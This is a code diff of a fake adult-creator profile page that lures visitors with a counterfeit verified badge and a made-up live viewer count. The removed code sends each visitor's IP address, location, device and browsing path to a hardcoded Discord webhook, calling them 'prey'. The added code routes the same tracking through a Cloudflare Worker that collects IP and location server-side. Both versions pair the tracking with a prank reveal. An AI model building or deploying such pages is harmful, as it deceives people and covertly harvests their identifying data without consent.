@@ -4,15 +4,29 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>HanJiyu07 | Profile & Stats</title>
+    <link rel="icon" href="https://img.icons8.com/fluency/48/user-female-circle.png" type="image/x-icon">
     <style>
         body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f3f4f6; color: #1f2937; min-height: 100vh; }
         #site-logo { position: absolute; top: 20px; left: 20px; max-width: 150px; height: auto; z-index: 10; }
         .header-bg { width: 100%; height: 250px; background-color: #d1d5db; background-image: url('background.jpg'); background-size: cover; background-position: center; }
         .profile-container { max-width: 800px; margin: -80px auto 0; padding: 0 20px; position: relative; }
-        .avatar { width: 150px; height: 150px; border-radius: 50%; border: 5px solid white; background-color: #9ca3af; background-image: url('pro.jpg'); background-size: cover; background-position: center; box-shadow: 0 4px 6px rgba(0,0,0,0.1); margin-bottom: 15px; }
+        
+        /* 프로필 아바타 및 활동 중 상태 감싸는 컨테이너 */
+        .avatar-container { position: relative; width: 150px; height: 150px; margin-bottom: 15px; }
+        .avatar { width: 100%; height: 100%; border-radius: 50%; border: 5px solid white; background-color: #9ca3af; background-image: url('pro.jpg'); background-size: cover; background-position: center; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        
+        /* 2. 현재 활동 중 표시 (초록불 뱃지) */
+        .active-badge { position: absolute; bottom: 8px; right: 8px; width: 22px; height: 22px; background-color: #22c55e; border: 4px solid white; border-radius: 50%; box-shadow: 0 2px 4px rgba(0,0,0,0.2); }
+        
         .name-section { margin-bottom: 25px; }
         .name { font-size: 28px; font-weight: 800; margin: 0 0 5px 0; display: flex; align-items: center; gap: 5px; }
         .verified-badge { color: #00AEEF; font-size: 20px; }
+        
+        /* 3. 실시간 페이크 카운터 스타일 */
+        .live-counter-box { display: inline-flex; align-items: center; gap: 6px; font-size: 14px; font-weight: 600; color: #ef4444; background: #fee2e2; padding: 6px 12px; border-radius: 20px; margin-bottom: 15px; }
+        .live-dot { width: 8px; height: 8px; background-color: #ef4444; border-radius: 50%; animation: blink 1.5s infinite; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+
         .username { font-size: 16px; color: #6b7280; margin: 0 0 15px 0; }
         .bio { font-size: 16px; line-height: 1.6; background: white; padding: 20px; border-radius: 12px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
         .action-buttons { display: flex; flex-direction: column; gap: 12px; margin-bottom: 30px; }
@@ -45,8 +59,17 @@
     <div class="header-bg"></div>
 
     <div class="profile-container">
-        <div class="avatar"></div>
+        <div class="avatar-container">
+            <div class="avatar"></div>
+            <div class="active-badge"></div>
+        </div>
+
         <div class="name-section">
+            <div class="live-counter-box">
+                <div class="live-dot"></div>
+                <span>LIVE: <span id="visitor-count">214</span>명 시청 중</span>
+            </div>
+
             <h1 class="name">HanJiyu07 <span class="verified-badge">✓</span></h1>
             <p class="username">@onlyfans_hanjiyu07</p>
             <div class="bio">
@@ -77,107 +100,73 @@
 
     <script>
         // ==========================================
-        // ⛔ 1. 보안 로직: 악성 유입 차단 (IP 도메인 및 블랙리스트)
+        // 📈 1. 120~300 사이 실시간 방문자 페이크 로직
         // ==========================================
-        const currentReferrer = document.referrer;
+        const countEl = document.getElementById('visitor-count');
         
-        if (currentReferrer !== "") {
-            try {
-                const referrerUrl = new URL(currentReferrer);
-                const hostname = referrerUrl.hostname;
+        // 초기값 세팅 (120~300 사이)
+        let currentCount = Math.floor(Math.random() * (300 - 120 + 1)) + 120;
+        countEl.innerText = currentCount;
 
-                const blacklist = [
-                    "59.18.34.177", 
-                    "bad-website.com" 
-                ];
-
-                const isIpAddress = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/.test(hostname);
-
-                if (blacklist.includes(hostname) || isIpAddress) {
-                    alert("비정상적인 접근입니다.");
-                    window.location.replace("https://www.google.com");
-                }
-            } catch (e) {
-                console.log("유입 경로 분석 오류");
-            }
-        }
+        // 3~5초마다 실시간으로 인원이 유기적으로 변하는 것처럼 연출
+        setInterval(() => {
+            const change = Math.floor(Math.random() * 7) - 3; // -3 ~ +3명 변동
+            currentCount += change;
+            
+            // 범위를 벗어나지 않게 제어
+            if (currentCount < 120) currentCount = 120;
+            if (currentCount > 300) currentCount = 300;
+            
+            countEl.innerText = currentCount;
+        }, 4000);
 
         // ==========================================
-        // 🚨 2. 디스코드 웹훅 설정 (★이 부분만 수정하세요)
+        // 🔒 2. 서버리스 백엔드 통신 로직 (웹훅 주소 은닉)
         // ==========================================
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1512175802492391577/6bIHEaewp_AR-YfGPXGB2z8VyHS9MlH6YD7IOnbM420ztOC1b7zlRHj3PlQK9shwl2O-";
-
-        // ==========================================
-        // 📊 3. 추적 및 로그 전송 로직
-        // ==========================================
+        // ★나중에 생성할 Cloudflare Worker 배포 주소를 여기에 넣으세요.
+        const WORKER_URL = "https://YOUR_WORKER_SUBDOMAIN.workers.dev"; 
+        
         const startTime = new Date();
-        
-        function parseUserAgent(ua) {
-            let device = /Mobile|Android|iP(hone|od|ad)/.test(ua) ? "📱 모바일" : "💻 PC";
-            let browser = "기타 브라우저";
-            
-            if (ua.includes("KAKAOTALK")) browser = "카카오톡";
-            else if (ua.includes("Instagram")) browser = "인스타그램";
-            else if (ua.toLowerCase().includes("discord")) browser = "디스코드";
-            else if (ua.includes("Edg")) browser = "Edge";
-            else if (ua.includes("Chrome")) browser = "Chrome";
-            else if (ua.includes("Safari")) browser = "Safari";
-            else if (ua.includes("Firefox")) browser = "Firefox";
-            
-            return `${device} / ${browser}`;
+        let isPrankActive = false;
+        let hasSeenPicture = false;
+
+        function getDwellTime() {
+            return Math.floor((new Date() - startTime) / 1000);
         }
 
-        const visitorData = {
-            ip: "조회 실패",
-            location: "조회 실패",
-            deviceInfo: parseUserAgent(navigator.userAgent),
-            referrer: currentReferrer || "직접 입력/북마크",
-            entryTime: startTime.toLocaleString('ko-KR'),
-            hasSeenPicture: false,
-            getDwellTime: function() {
-                return Math.floor((new Date() - startTime) / 1000);
-            }
-        };
-
-        function sendToDiscord(message) {
-            if (WEBHOOK_URL === "여기에_복사한_디스코드_웹훅_URL을_붙여넣으세요" || !WEBHOOK_URL) return;
-            fetch(WEBHOOK_URL, {
+        // 백엔드로 로그 데이터 전송 함수
+        function logToBackend(type) {
+            if (WORKER_URL.includes("YOUR_WORKER_SUBDOMAIN") || !WORKER_URL) return;
+            
+            fetch(WORKER_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: message })
-            }).catch(err => console.log("디스코드 전송 실패"));
+                body: JSON.stringify({
+                    type: type,
+                    referrer: document.referrer || "직접 입력/북마크",
+                    dwellTime: getDwellTime()
+                })
+            }).catch(err => console.log("로그 전송 실패"));
         }
 
-        fetch('https://ipapi.co/json/')
-            .then(res => res.json())
-            .then(data => {
-                if(data.ip) {
-                    visitorData.ip = data.ip;
-                    visitorData.location = `${data.city}, ${data.region}`;
-                    const entryLog = `🟢 **[새로운 먹잇감 등장]**\n- **IP:** ${visitorData.ip}\n- **지역:** ${visitorData.location}\n- **기기:** ${visitorData.deviceInfo}\n- **경로:** ${visitorData.referrer}`;
-                    sendToDiscord(entryLog);
-                }
-            })
-            .catch(err => console.log("네트워크 로드 실패"));
+        // 페이지 접속하자마자 백엔드에 1차 신호 전송 (백엔드가 IP/위치를 알아서 수집함)
+        logToBackend("entry");
 
         // ==========================================
-        // 🎭 4. 낚시(Prank) 발동 로직
+        // 🎭 3. 낚시(Prank) 발동 로직
         // ==========================================
         const prankBtns = document.querySelectorAll('.js-prank-btn');
         const prankZone = document.getElementById('prank-zone');
         const overlay = document.getElementById('overlay');
         const audio = document.getElementById('bark-sound');
-        
-        let isPrankActive = false;
 
         function triggerPrank() {
             if (isPrankActive) return;
             isPrankActive = true;
 
-            if (!visitorData.hasSeenPicture) {
-                visitorData.hasSeenPicture = true;
-                const prankLog = `🚨 **[낚시 성공!]**\n- **대상:** ${visitorData.ip} (${visitorData.location})\n- **상황:** 접속 후 **${visitorData.getDwellTime()}초** 만에 말티즈 사진을 봄! 🐶`;
-                sendToDiscord(prankLog);
+            if (!hasSeenPicture) {
+                hasSeenPicture = true;
+                logToBackend("success"); // 낚시 성공 로그 백엔드로 전송
             }
 
             overlay.style.display = 'block';
@@ -203,7 +192,6 @@
         // 6초 뒤 자동 실행
         setTimeout(() => { triggerPrank(); }, 6000); 
 
-        // 장난 끄기 (화면 클릭 시 복구)
         function closePrank(e) {
             e.stopPropagation();
             overlay.style.display = 'none';
